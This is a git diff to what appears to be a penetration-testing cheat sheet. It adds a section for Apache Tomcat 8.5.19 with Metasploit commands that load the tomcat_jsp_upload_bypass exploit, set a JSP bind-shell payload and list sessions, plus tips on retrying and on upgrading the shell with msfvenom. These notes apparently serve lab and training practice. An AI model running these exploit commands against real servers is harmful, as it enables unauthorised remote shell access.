@@ -424,6 +424,7 @@ set CMD <command>
   - [ProFTPD 1.3.3c](#ProFTPD-133c) 
   - [vsftpd 2.3.4](#vsftpd-234)
 - HTTP
+  - [Apache Tomcat 8.5.19](#Apache-Tomcat-8519)
   - [BadBlue httpd 2.7](#BadBlue-httpd-27)
   - [Rejetto HttpFileServer 2.3](#Rejetto-HttpFileServer-23)
 - SMB/Samba
@@ -452,6 +453,24 @@ use exploit/unix/ftp/vsftpd_234_backdoor
 ```
 
 ## HTTP
+### Apache Tomcat 8.5.19
+```
+use exploit/multi/http/tomcat_jsp_upload_bypass
+set payload java/jsp_shell_bind_tcp
+set SHELL cmd
+```
+- Why use non-staged, bind shell payload?
+- If exploit fails, try again.
+
+```
+sessions -l
+```
+- Because shell is `shell java/linux`, cannot upgrade to meterpreter normally.
+- Generate payload with msfvenom instead.
+
+```
+```
+
 ### BadBlue httpd 2.7
 ```
 use exploit/windows/http/badblue_passthru
